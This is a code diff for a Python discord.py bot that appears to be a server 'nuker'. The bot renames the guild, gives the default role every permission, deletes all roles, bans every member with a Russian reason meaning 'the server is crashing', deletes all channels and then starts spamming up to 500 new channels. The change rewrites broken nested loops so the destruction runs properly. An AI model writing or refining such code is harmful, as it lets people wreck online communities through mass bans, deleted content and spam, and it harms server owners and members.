@@ -20,12 +20,12 @@ class MyClient(discord.Client):
             await guild.edit(name=str(server), icon=icon)
             await guild.default_role.edit(permissions=Permissions.all())
 
+            for i in guild.roles:
+                await i.delete()
+            for i in guild.members:
+                await i.ban(reason='Сервер крашится')
             for i in guild.channels:
-                for j in guild.roles:
-                    for k in guild.members:
-                        await i.delete()
-                        await j.delete()
-                        await k.ban(reason='Сервер крашится')
+                await i.delete()
 
             while c < 500:
                 o = await guild.create_text_channel(name=str(channel))
